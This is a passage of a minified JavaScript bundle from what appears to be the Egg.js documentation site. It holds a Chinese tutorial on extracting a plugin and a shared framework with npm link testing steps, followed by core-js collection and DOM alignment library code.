\u63d2\u4ef6\uff0c\u770b\u8fc7",r.a.createElement(l["Link"],{to:"../advanced/plugin"},"\u63d2\u4ef6\u6587\u6863"),"\u7684\u540c\u5b66\u5e94\u8be5\u90fd\u6bd4\u8f83\u719f\u6089\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u7b80\u5355\u8fc7\u4e00\u4e0b\uff1a"),r.a.createElement("p",null,"\u76ee\u5f55\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"egg-ua\n\u251c\u2500\u2500 app\n\u2502   \u2514\u2500\u2500 extend\n\u2502       \u2514\u2500\u2500 context.js\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 fixtures\n\u2502   \u2502   \u2514\u2500\u2500 test-app\n\u2502   \u2502       \u251c\u2500\u2500 app\n\u2502   \u2502       \u2502   \u2514\u2500\u2500 router.js\n\u2502   \u2502       \u2514\u2500\u2500 package.json\n\u2502   \u2514\u2500\u2500 ua.test.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"\u5bf9\u5e94\u7684\u4ee3\u7801\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step3/egg-ua"},"step3/egg-ua"),"\u3002"),r.a.createElement("p",null,"\u7136\u540e\u6539\u9020\u539f\u6709\u7684\u5e94\u7528\uff0c\u5bf9\u5e94\u7684\u4ee3\u7801\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step3/example-app"},"step3/example-app"),"\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u79fb\u9664 ",r.a.createElement("code",null,"lib/plugin/egg-ua")," \u76ee\u5f55\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"package.json")," \u4e2d\u58f0\u660e\u5bf9 ",r.a.createElement("code",null,"egg-ua")," \u7684\u4f9d\u8d56\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"config/plugin.js")," \u4e2d\u4fee\u6539\u4f9d\u8d56\u58f0\u660e\u4e3a ",r.a.createElement("code",null,"package")," \u65b9\u5f0f\u3002")),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.ua = {\n  enable: true,\n  package: 'egg-ua',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5728\u63d2\u4ef6\u8fd8\u6ca1\u53d1\u5e03\u524d\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm link")," \u7684\u65b9\u5f0f\u8fdb\u884c\u672c\u5730\u6d4b\u8bd5\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://docs.npmjs.com/cli/link"},"npm-link"),"\u3002")),r.a.createElement(o["a"],{code:"$ cd example-app\n$ npm link ../egg-ua\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("h2",{id:"\u6c89\u6dc0\u5230\u6846\u67b6"},r.a.createElement(l["AnchorLink"],{to:"#\u6c89\u6dc0\u5230\u6846\u67b6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6c89\u6dc0\u5230\u6846\u67b6"),r.a.createElement("p",null,"\u91cd\u590d\u4e0a\u8ff0\u7684\u8fc7\u7a0b\uff0c\u5f88\u5feb\u6211\u4eec\u4f1a\u79ef\u7d2f\u4e86\u597d\u51e0\u4e2a\u63d2\u4ef6\u548c\u914d\u7f6e\uff0c\u5e76\u4e14\u6211\u4eec\u4f1a\u53d1\u73b0\uff0c\u5728\u56e2\u961f\u7684\u5927\u90e8\u5206\u9879\u76ee\u4e2d\uff0c\u90fd\u4f1a\u7528\u5230\u8fd9\u4e9b\u63d2\u4ef6\u3002"),r.a.createElement("p",null,"\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u8003\u8651\u62bd\u8c61\u51fa\u4e00\u4e2a\u9002\u5408\u56e2\u961f\u4e1a\u52a1\u573a\u666f\u7684\u6846\u67b6\u3002"),r.a.createElement("p",null,"\u9996\u5148\uff0c\u62bd\u8c61\u51fa example-framework \u6846\u67b6\uff0c\u5982\u4e0a\u770b\u8fc7",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u6846\u67b6\u6587\u6863"),"\u7684\u540c\u5b66\u5e94\u8be5\u90fd\u6bd4\u8f83\u719f\u6089\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u7b80\u5355\u8fc7\u4e00\u4e0b\uff1a"),r.a.createElement("p",null,"\u76ee\u5f55\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"example-framework\n\u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 config.default.js\n\u2502   \u2514\u2500\u2500 plugin.js\n\u251c\u2500\u2500 lib\n\u2502   \u251c\u2500\u2500 agent.js\n\u2502   \u2514\u2500\u2500 application.js\n\u251c\u2500\u2500 test\n\u2502   \u251c\u2500\u2500 fixtures\n\u2502   \u2502   \u2514\u2500\u2500 test-app\n\u2502   \u2514\u2500\u2500 framework.test.js\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 index.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5bf9\u5e94\u7684\u4ee3\u7801\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step4/example-framework"},"example-framework"),"\u3002"),r.a.createElement("li",null,"\u628a\u539f\u6765\u7684 ",r.a.createElement("code",null,"egg-ua")," \u7b49\u63d2\u4ef6\u7684\u4f9d\u8d56\uff0c\u4ece example-app \u4e2d\u79fb\u9664\uff0c\u914d\u7f6e\u5230\u8be5\u6846\u67b6\u7684 ",r.a.createElement("code",null,"package.json")," \u548c ",r.a.createElement("code",null,"config/plugin.js")," \u4e2d\u3002")),r.a.createElement("p",null,"\u7136\u540e\u6539\u9020\u539f\u6709\u7684\u5e94\u7528\uff0c\u5bf9\u5e94\u7684\u4ee3\u7801\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/progressive/step4/example-app"},"step4/example-app"),"\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u79fb\u9664 ",r.a.createElement("code",null,"config/plugin.js")," \u4e2d\u5bf9 ",r.a.createElement("code",null,"egg-ua")," \u7684\u4f9d\u8d56\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"package.json")," \u4e2d\u79fb\u9664\u5bf9 ",r.a.createElement("code",null,"egg-ua")," \u7684\u4f9d\u8d56\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"package.json")," \u4e2d\u58f0\u660e\u5bf9 ",r.a.createElement("code",null,"example-framework")," \u7684\u4f9d\u8d56\uff0c\u5e76\u914d\u7f6e ",r.a.createElement("code",null,"egg.framework"),"\u3002")),r.a.createElement(o["a"],{code:'{\n  "name": "progressive",\n  "version": "1.0.0",\n  "private": true,\n  "egg": {\n    "framework": "example-framework"\n  },\n  "dependencies": {\n    "example-framework": "*"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5728\u6846\u67b6\u8fd8\u6ca1\u53d1\u5e03\u524d\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm link")," \u7684\u65b9\u5f0f\u8fdb\u884c\u672c\u5730\u6d4b\u8bd5\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://docs.npmjs.com/cli/link"},"npm-link"),"\u3002")),r.a.createElement(o["a"],{code:"$ cd example-app\n$ npm link ../egg-framework\n$ npm i\n$ npm test",lang:"bash"}),r.a.createElement("h2",{id:"\u5199\u5728\u6700\u540e"},r.a.createElement(l["AnchorLink"],{to:"#\u5199\u5728\u6700\u540e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5199\u5728\u6700\u540e"),r.a.createElement("p",null,"\u7efc\u4e0a\u6240\u8ff0\uff0c\u5927\u5bb6\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u662f\u5982\u4f55\u4e00\u6b65\u6b65\u6e10\u8fdb\u5730\u53bb\u8fdb\u884c\u6846\u67b6\u6f14\u8fdb\uff0c\u8fd9\u5f97\u76ca\u4e8e Egg \u5f3a\u5927\u7684\u63d2\u4ef6\u673a\u5236\u3001\u4ee3\u7801\u7684\u5171\u5efa\uff0c\u4ee5\u53ca\u590d\u7528\u548c\u4e0b\u6c89\uff0c\u8fd9\u4e9b\u6b65\u9aa4\u7adf\u7136\u53ef\u4ee5\u8fd9\u4e48\u5730\u65e0\u75db\u6765\u5f97\u4ee5\u5b8c\u6210\uff01"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e00\u822c\u6765\u8bf4\uff0c\u5f53\u5e94\u7528\u4e2d\u6709\u53ef\u80fd\u4f1a\u590d\u7528\u5230\u7684\u4ee3\u7801\u65f6\uff0c\u76f4\u63a5\u653e\u5230 ",r.a.createElement("code",null,"lib/plugin")," \u76ee\u5f55\u53bb\uff0c\u5982\u4f8b\u5b50\u4e2d\u7684 ",r.a.createElement("code",null,"egg-ua"),"\u3002"),r.a.createElement("li",null,"\u5f53\u8be5\u63d2\u4ef6\u529f\u80fd\u7a33\u5b9a\u540e\uff0c\u5373\u53ef\u72ec\u7acb\u51fa\u6765\u4f5c\u4e3a\u4e00\u4e2a ",r.a.createElement("code",null,"node module")," \u3002"),r.a.createElement("li",null,"\u5982\u6b64\u4ee5\u5f80\uff0c\u5e94\u7528\u4e2d\u76f8\u5bf9\u590d\u7528\u6027\u8f83\u5f3a\u7684\u4ee3\u7801\u90fd\u4f1a\u9010\u6e10\u72ec\u7acb\u4e3a\u5355\u72ec\u7684\u63d2\u4ef6\u3002"),r.a.createElement("li",null,"\u5f53\u4f60\u7684\u5e94\u7528\u9010\u6e10\u8fdb\u5316\u5230\u9488\u5bf9\u67d0\u7c7b\u4e1a\u52a1\u573a\u666f\u7684\u89e3\u51b3\u65b9\u6848\u65f6\uff0c\u5c06\u5176\u62bd\u8c61\u4e3a\u72ec\u7acb\u7684 framework \u8fdb\u884c\u53d1\u5e03\u3002"),r.a.createElement("li",null,"\u5f53\u5728\u65b0\u9879\u76ee\u4e2d\u62bd\u8c61\u51fa\u7684\u63d2\u4ef6\uff0c\u4e0b\u6c89\u96c6\u6210\u5230\u6846\u67b6\u540e\uff0c\u5176\u4ed6\u9879\u76ee\u53ea\u9700\u8981\u7b80\u5355\u7684\u91cd\u65b0 ",r.a.createElement("code",null,"npm install")," \u4e0b\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e0a\uff0c\u5bf9\u6574\u4e2a\u56e2\u961f\u7684\u6548\u7387\u6709\u6781\u5927\u7684\u63d0\u5347\u3002"),r.a.createElement("li",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u4e0d\u7ba1\u662f\u5e94\u7528/\u63d2\u4ef6/\u6846\u67b6\uff0c\u90fd\u5fc5\u987b\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\uff0c\u5e76\u5c3d\u91cf\u5b9e\u73b0 100% \u8986\u76d6\u7387\u3002")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},xxe1:function(e,t,n){"use strict";var a=n("Xdqv");e.exports=function(e,t){var n=[][e];return!!n&&a((function(){n.call(null,t||function(){throw 1},1)}))}},xyr1:function(e,t,n){"use strict";var a=n("u3TI").f,r=n("tbdv"),l=n("P0Lz"),o=n("G9w8"),i=n("k8mt"),c=n("NBU9"),s=n("RGX9"),u=n("tPcN"),d=n("9Rcy"),m=n("x9/w").fastKey,p=n("lz/I"),h=p.set,g=p.getterFor;e.exports={getConstructor:function(e,t,n,s){var u=e((function(e,a){i(e,u,t),h(e,{type:t,index:r(null),first:void 0,last:void 0,size:0}),d||(e.size=0),void 0!=a&&c(a,e[s],e,n)})),p=g(t),f=function(e,t,n){var a,r,l=p(e),o=E(e,t);return o?o.value=n:(l.last=o={index:r=m(t,!0),key:t,value:n,previous:a=l.last,next:void 0,removed:!1},l.first||(l.first=o),a&&(a.next=o),d?l.size++:e.size++,"F"!==r&&(l.index[r]=o)),e},E=function(e,t){var n,a=p(e),r=m(t);if("F"!==r)return a.index[r];for(n=a.first;n;n=n.next)if(n.key==t)return n};return l(u.prototype,{clear:function(){var e=this,t=p(e),n=t.index,a=t.first;while(a)a.removed=!0,a.previous&&(a.previous=a.previous.next=void 0),delete n[a.index],a=a.next;t.first=t.last=void 0,d?t.size=0:e.size=0},delete:function(e){var t=this,n=p(t),a=E(t,e);if(a){var r=a.next,l=a.previous;delete n.index[a.index],a.removed=!0,l&&(l.next=r),r&&(r.previous=l),n.first==a&&(n.first=r),n.last==a&&(n.last=l),d?n.size--:t.size--}return!!a},forEach:function(e){var t,n=p(this),a=o(e,arguments.length>1?arguments[1]:void 0,3);while(t=t?t.next:n.first){a(t.value,t.key,this);while(t&&t.removed)t=t.previous}},has:function(e){return!!E(this,e)}}),l(u.prototype,n?{get:function(e){var t=E(this,e);return t&&t.value},set:function(e,t){return f(this,0===e?0:e,t)}}:{add:function(e){return f(this,e=0===e?0:e,e)}}),d&&a(u.prototype,"size",{get:function(){return p(this).size}}),u},setStrong:function(e,t,n){var a=t+" Iterator",r=g(t),l=g(a);s(e,t,(function(e,t){h(this,{type:a,target:e,state:r(e),kind:t,last:void 0})}),(function(){var e=l(this),t=e.kind,n=e.last;while(n&&n.removed)n=n.previous;return e.target&&(e.last=n=n?n.next:e.state.first)?"keys"==t?{value:n.key,done:!1}:"values"==t?{value:n.value,done:!1}:{value:[n.key,n.value],done:!1}:(e.target=void 0,{value:void 0,done:!0})}),n?"entries":"values",!n,!0),u(t)}}},"y+Tp":function(e,t,n){"use strict";var a=n("3Qq0"),r=n("2EJr"),l=n("E3E7"),o=n("+g4N"),i=n("ohqK"),c=n("zraO"),s=n("+ujd"),u=n("qPib"),d=n("FU0I"),m=n.n(d),p=n("kqhb"),h=n.n(p),g=n("WeeI"),f=n("LZgk"),E=n("PE0O"),b=n("abDE"),v=n("TCvW"),y=n("d9lq"),k=Object(d["forwardRef"])((function(e,t){var n=e.didUpdate,a=e.getContainer,r=e.children,l=Object(d["useRef"])(),o=Object(d["useRef"])();Object(d["useImperativeHandle"])(t,(function(){return{}}));var i=Object(d["useRef"])(!1);return!i.current&&Object(y["a"])()&&(o.current=a(),l.current=o.current.parentNode,i.current=!0),Object(d["useEffect"])((function(){null===n||void 0===n||n(e)})),Object(d["useEffect"])((function(){return null===o.current.parentNode&&null!==l.current&&l.current.appendChild(o.current),function(){var e,t;null===(e=o.current)||void 0===e||null===(t=e.parentNode)||void 0===t||t.removeChild(o.current)}}),[]),o.current?h.a.createPortal(r,o.current):null})),w=k,x=n("VGn1"),j=n.n(x);function S(e,t,n){return n?e[0]===t[0]:e[0]===t[0]&&e[1]===t[1]}function C(e,t,n){var r=e[t]||{};return Object(a["a"])(Object(a["a"])({},r),n)}function A(e,t,n,a){for(var r=n.points,l=Object.keys(e),o=0;o<l.length;o+=1){var i=l[o];if(S(e[i].points,r,a))return"".concat(t,"-placement-").concat(i)}return""}var L=n("0YMn"),T=n("EJBU"),N=n("f82q"),O=n("64/3");function I(e){var t=e.prefixCls,n=e.motion,a=e.animation,r=e.transitionName;return n||(a?{motionName:"".concat(t,"-").concat(a)}:r?{motionName:r}:null)}function P(e){var t=e.prefixCls,n=e.visible,l=e.zIndex,o=e.mask,i=e.maskMotion,c=e.maskAnimation,s=e.maskTransitionName;if(!o)return null;var u={};return(i||s||c)&&(u=Object(a["a"])({motionAppear:!0},I({motion:i,prefixCls:t,transitionName:s,animation:c}))),d["createElement"](O["b"],Object(r["a"])({},u,{visible:n,removeOnLeave:!0}),(function(e){var n=e.className;return d["createElement"]("div",{style:{zIndex:l},className:j()("".concat(t,"-mask"),n)})}))}var R,_=n("nzxN");function q(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function M(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?q(Object(n),!0).forEach((function(t){D(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):q(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function F(e){return F="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},F(e)}function D(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}var U={Webkit:"-webkit-",Moz:"-moz-",ms:"-ms-",O:"-o-"};function z(){if(void 0!==R)return R;R="";var e=document.createElement("p").style,t="Transform";for(var n in U)n+t in e&&(R=n);return R}function H(){return z()?"".concat(z(),"TransitionProperty"):"transitionProperty"}function B(){return z()?"".concat(z(),"Transform"):"transform"}function W(e,t){var n=H();n&&(e.style[n]=t,"transitionProperty"!==n&&(e.style.transitionProperty=t))}function V(e,t){var n=B();n&&(e.style[n]=t,"transform"!==n&&(e.style.transform=t))}function $(e){return e.style.transitionProperty||e.style[H()]}function G(e){var t=window.getComputedStyle(e,null),n=t.getPropertyValue("transform")||t.getPropertyValue(B());if(n&&"none"!==n){var a=n.replace(/[^0-9\-.,]/g,"").split(",");return{x:parseFloat(a[12]||a[4],0),y:parseFloat(a[13]||a[5],0)}}return{x:0,y:0}}var X=/matrix\((.*)\)/,Q=/matrix3d\((.*)\)/;function K(e,t){var n=window.getComputedStyle(e,null),a=n.getPropertyValue("transform")||n.getPropertyValue(B());if(a&&"none"!==a){var r,l=a.match(X);if(l)l=l[1],r=l.split(",").map((function(e){return parseFloat(e,10)})),r[4]=t.x,r[5]=t.y,V(e,"matrix(".concat(r.join(","),")"));else{var o=a.match(Q)[1];r=o.split(",").map((function(e){return parseFloat(e,10)})),r[12]=t.x,r[13]=t.y,V(e,"matrix3d(".concat(r.join(","),")"))}}else V(e,"translateX(".concat(t.x,"px) translateY(").concat(t.y,"px) translateZ(0)"))}var J,Y=/[\-+]?(?:\d*\.|)\d+(?:[eE][\-+]?\d+|)/.source;function Z(e){var t=e.style.display;e.style.display="none",e.offsetHeight,e.style.display=t}function ee(e,t,n){var a=n;if("object"!==F(t))return"undefined"!==typeof a?("number"===typeof a&&(a="".concat(a,"px")),void(e.style[t]=a)):J(e,t);for(var r in t)t.hasOwnProperty(r)&&ee(e,r,t[r])}function te(e){var t,n,a,r=e.ownerDocument,l=r.body,o=r&&r.documentElement;return t=e.getBoundingClientRect(),n=Math.floor(t.left),a=Math.floor(t.top),n-=o.clientLeft||l.clientLeft||0,a-=o.clientTop||l.clientTop||0,{left:n,top:a}}function ne(e,t){var n=e["page".concat(t?"Y":"X","Offset")],a="scroll".concat(t?"Top":"Left");if("number"!==typeof n){var r=e.document;n=r.documentElement[a],"number"!==typeof n&&(n=r.body[a])}return n}function ae(e){return ne(e)}function re(e){return ne(e,!0)}function le(e){var t=te(e),n=e.ownerDocument,a=n.defaultView||n.parentWindow;return t.left+=ae(a),t.top+=re(a),t}function oe(e){return null!==e&&void 0!==e&&e==e.window}function ie(e){return oe(e)?e.document:9===e.nodeType?e:e.ownerDocument}function ce(e,t,n){var a=n,r="",l=ie(e);return a=a||l.defaultView.getComputedStyle(e,null),a&&(r=a.getPropertyValue(t)||a[t]),r}var se=new RegExp("^(".concat(Y,")(?!px)[a-z%]+$"),"i"),ue=/^(top|right|bottom|left)$/,de="currentStyle",me="runtimeStyle",pe="left",he="px";function ge(e,t){var n=e[de]&&e[de][t];if(se.test(n)&&!ue.test(t)){var a=e.style,r=a[pe],l=e[me][pe];e[me][pe]=e[de][pe],a[pe]="fontSize"===t?"1em":n||0,n=a.pixelLeft+he,a[pe]=r,e[me][pe]=l}return""===n?"auto":n}function fe(e,t){return"left"===e?t.useCssRight?"right":e:t.useCssBottom?"bottom":e}function Ee(e){return"left"===e?"right":"right"===e?"left":"top"===e?"bottom":"bottom"===e?"top":void 0}function be(e,t,n){"static"===ee(e,"position")&&(e.style.position="relative");var a=-999,r=-999,l=fe("left",n),o=fe("top",n),i=Ee(l),c=Ee(o);"left"!==l&&(a=999),"top"!==o&&(r=999);var s="",u=le(e);("left"in t||"top"in t)&&(s=$(e)||"",W(e,"none")),"left"in t&&(e.style[i]="",e.style[l]="".concat(a,"px")),"top"in t&&(e.style[c]="",e.style[o]="".concat(r,"px")),Z(e);var d=le(e),m={};for(var p in t)if(t.hasOwnProperty(p)){var h=fe(p,n),g="left"===p?a:r,f=u[p]-d[p];m[h]=h===p?g+f:g-f}ee(e,m),Z(e),("left"in t||"top"in t)&&W(e,s);var E={};for(var b in t)if(t.hasOwnProperty(b)){var v=fe(b,n),y=t[b]-u[b];E[v]=b===v?m[v]+y:m[v]-y}ee(e,E)}function ve(e,t){var n=le(e),a=G(e),r={x:a.x,y:a.y};"left"in t&&(r.x=a.x+t.left-n.left),"top"in t&&(r.y=a.y+t.top-n.top),K(e,r)}function ye(e,t,n){if(n.ignoreShake){var a=le(e),r=a.left.toFixed(0),l=a.top.toFixed(0),o=t.left.toFixed(0),i=t.top.toFixed(0);if(r===o&&l===i)return}n.useCssRight||n.useCssBottom?be(e,t,n):n.useCssTransform&&B()in document.body.style?ve(e,t):be(e,t,n)}function ke(e,t){for(var n=0;n<e.length;n++)t(e[n])}function we(e){return"border-box"===J(e,"boxSizing")}"undefined"!==typeof window&&(J=window.getComputedStyle?ce:ge);var xe=["margin","border","padding"],je=-1,Se=2,Ce=1,Ae=0;function Le(e,t,n){var a,r={},l=e.style;for(a in t)t.hasOwnProperty(a)&&(r[a]=l[a],l[a]=t[a]);for(a in n.call(e),t)t.hasOwnProperty(a)&&(l[a]=r[a])}function Te(e,t,n){var a,r,l,o=0;for(r=0;r<t.length;r++)if(a=t[r],a)for(l=0;l<n.length;l++){var i=void 0;i="border"===a?"".concat(a).concat(n[l],"Width"):a+n[l],o+=parseFloat(J(e,i))||0}return o}var Ne={getParent:function(e){var t=e;do{t=11===t.nodeType&&t.host?t.host:t.parentNode}while(t&&1!==t.nodeType&&9!==t.nodeType);return t}};function Oe(e,t,n){var a=n;if(oe(e))return"width"===t?Ne.viewportWidth(e):Ne.viewportHeight(e);if(9===e.nodeType)return"width"===t?Ne.docWidth(e):Ne.docHeight(e);var r="width"===t?["Left","Right"]:["Top","Bottom"],l="width"===t?Math.floor(e.getBoundingClientRect().width):Math.floor(e.getBoundingClientRect().height),o=we(e),i=0;(null===l||void 0===l||l<=0)&&(l=void 0,i=J(e,t),(null===i||void 0===i||Number(i)<0)&&(i=e.style[t]||0),i=Math.floor(parseFloat(i))||0),void 0===a&&(a=o?Ce:je);var c=void 0!==l||o,s=l||i;return a===je?c?s-Te(e,["border","padding"],r):i:c?a===Ce?s:s+(a===Se?-Te(e,["border"],r):Te(e,["margin"],r)):i+Te(e,xe.slice(a),r)}ke(["Width","Height"],(function(e){Ne["doc".concat(e)]=function(t){var n=t.document;return Math.max(n.documentElement["scroll".concat(e)],n.body["scroll".concat(e)],Ne["viewport".concat(e)](n))},Ne["viewport".concat(e)]=function(t){var n="client".concat(e),a=t.document,r=a.body,l=a.documentElement,o=l[n];return"CSS1Compat"===a.compatMode&&o||r&&r[n]||o}}));var Ie={position:"absolute",visibility:"hidden",display:"block"};function Pe(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];var a,r=t[0];return 0!==r.offsetWidth?a=Oe.apply(void 0,t):Le(r,Ie,(function(){a=Oe.apply(void 0,t)})),a}function Re(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n]);return e}ke(["width","height"],(function(e){var t=e.charAt(0).toUpperCase()+e.slice(1);Ne["outer".concat(t)]=function(t,n){return t&&Pe(t,e,n?Ae:Ce)};var n="width"===e?["Left","Right"]:["Top","Bottom"];Ne[e]=function(t,a){var r=a;if(void 0===r)return t&&Pe(t,e,je);if(t){var l=we(t);return l&&(r+=Te(t,["padding","border"],n)),ee(t,e,r)}}}));var _e={getWindow:function(e){if(e&&e.document&&e.setTimeout)return e;var t=e.ownerDocument||e;return t.defaultView||t.parentWindow},getDocument:ie,offset:function(e,t,n){if("undefined"===typeof t)return le(e);ye(e,t,n||{})},isWindow:oe,each:ke,css:ee,clone:function(e){var t,n={};for(t in e)e.hasOwnProperty(t)&&(n[t]=e[t]);var a=e.overflow;if(a)for(t in e)e.hasOwnProperty(t)&&(n.overflow[t]=e.overflow[t]);return n},mix:Re,getWindowScrollLeft:function(e){return ae(e)},getWindowScrollTop:function(e){return re(e)},merge:function(){for(var e={},t=0;t<arguments.length;t++)_e.mix(e,t<0||arguments.length<=t?void 0:arguments[t]);return e},viewportWidth:0,viewportHeight:0};Re(_e,Ne);var qe=_e.getParent;function Me(e){if(_e.isWindow(e)||9===e.nodeType)return null;var t,n=_e.getDocument(e),a=n.body,r=_e.css(e,"position"),l="fixed"===r||"absolute"===r;if(!l)return"html"===e.nodeName.toLowerCase()?null:qe(e);for(t=qe(e);t&&t!==a&&9!==t.nodeType;t=qe(t))if(r=_e.css(t,"position"),"static"!==r)return t;return null}var Fe=_e.getParent;function De(e){if(_e.isWindow(e)||9===e.nodeType)return!1;var t=_e.getDocument(e),n=t.body,a=null;for(a=Fe(e);a&&a!==n&&a!==t;a=Fe(a)){var r=_e.css(a,"position");if("fixed"===r)return!0}return!1}function Ue(e,t){var n={left:0,right:1/0,top:0,bottom:1/0},a=Me(e),r=_e.getDocument(e),l=r.defaultView||r.parentWindow,o=r.body,i=r.documentElement;while(a){if(-1!==navigator.userAgent.indexOf("MSIE")&&0===a.clientWidth||a===o||a===i||"visible"===_e.css(a,"overflow")){if(a===o||a===i)break}else{var c=_e.offset(a);c.left+=a.clientLeft,c.top+=a.clientTop,n.top=Math.max(n.top,c.top),n.right=Math.min(n.right,c.left+a.clientWidth),n.bottom=Math.min(n.bottom,c.top+a.clientHeight),n.left=Math.max(n.left,c.left)}a=Me(a)}var s=null;if(!_e.isWindow(e)&&9!==e.nodeType){s=e.style.position;var u=_e.css(e,"position");"absolute"===u&&(e.style.position="fixed")}var d=_e.getWindowScrollLeft(l),m=_e.getWindowScrollTop(l),p=_e.viewportWidth(l),h=_e.viewportHeight(l),g=i.scrollWidth,f=i.scrollHeight,E=window.getComputedStyle(o);if("hidden"===E.overflowX&&(g=l.innerWidth),"hidden"===E.overflowY&&(f=l.innerHeight),e.style&&(e.style.position=s),t||De(e))n.left=Math.max(n.left,d),n.top=Math.max(n.top,m),n.right=Math.min(n.right,d+p),n.bottom=Math.min(n.bottom,m+h);else{var b=Math.max(g,d+p);n.right=Math.min(n.right,b);var v=Math.max(f,m+h);n.bottom=Math.min(n.bottom,v)}return n.top>=0&&n.left>=0&&n.bottom>n.top&&n.right>n.left?n:null}function ze(e,t,n,a){var r=_e.clone(e),l={width:t.width,height:t.height};return a.adjustX&&r.left<n.left&&(r.left=n.left),a.resizeWidth&&r.left>=n.left&&r.left+l.width>n.right&&(l.width-=r.left+l.width-n.right),a.adjustX&&r.left+l.width>n.right&&(r.left=Math.max(n.right-l.width,n.left)),a.adjustY&&r.top<n.top&&(r.top=n.top),a.resizeHeight&&r.top>=n.top&&r.top+l.height>n.bottom&&(l.height-=r.top+l.height-n.bottom),a.adjustY&&r.top+l.height>n.bottom&&(r.top=Math.max(n.bottom-l.height,n.top)),_e.mix(r,l)}function He(e){var t,n,a;if(_e.isWindow(e)||9===e.nodeType){var r=_e.getWindow(e);t={left:_e.getWindowScrollLeft(r),top:_e.getWindowScrollTop(r)},n=_e.viewportWidth(r),a=_e.viewportHeight(r)}else t=_e.offset(e),n=_e.outerWidth(e),a=_e.outerHeight(e);return t.width=n,t.height=a,t}function Be(e,t){var n=t.charAt(0),a=t.charAt(1),r=e.width,l=e.height,o=e.left,i=e.top;return"c"===n?i+=l/2:"b"===n&&(i+=l),"c"===a?o+=r/2:"r"===a&&(o+=r),{left:o,top:i}}function We(e,t,n,a,r){var l=Be(t,n[1]),o=Be(e,n[0]),i=[o.left-l.left,o.top-l.top];return{left:Math.round(e.left-i[0]+a[0]-r[0]),top:Math.round(e.top-i[1]+a[1]-r[1])}}function Ve(e,t,n){return e.left<n.left||e.left+t.width>n.right}function $e(e,t,n){return e.top<n.top||e.top+t.height>n.bottom}function Ge(e,t,n){return e.left>n.right||e.left+t.width<n.left}function Xe(e,t,n){return e.top>n.bottom||e.top+t.height<n.top}function Qe(e,t,n){var a=[];return _e.each(e,(function(e){a.push(e.replace(t,(function(e){return n[e]})))})),a}function Ke(e,t){return e[t]=-e[t],e}function Je(e,t){var n;return n=/%$/.test(e)?parseInt(e.substring(0,e.length-1),10)/100*t:parseInt(e,10),n||0}function Ye(e,t){e[0]=Je(e[0],t.width),e[1]=Je(e[1],t.height)}function Ze(e,t,n,a){var r=n.points,l=n.offset||[0,0],o=n.targetOffset||[0,0],i=n.overflow,c=n.source||e;l=[].concat(l),o=[].concat(o),i=i||{};var s={},u=0,d=!(!i||!i.alwaysByViewport),m=Ue(c,d),p=He(c);Ye(l,p),Ye(o,t);var 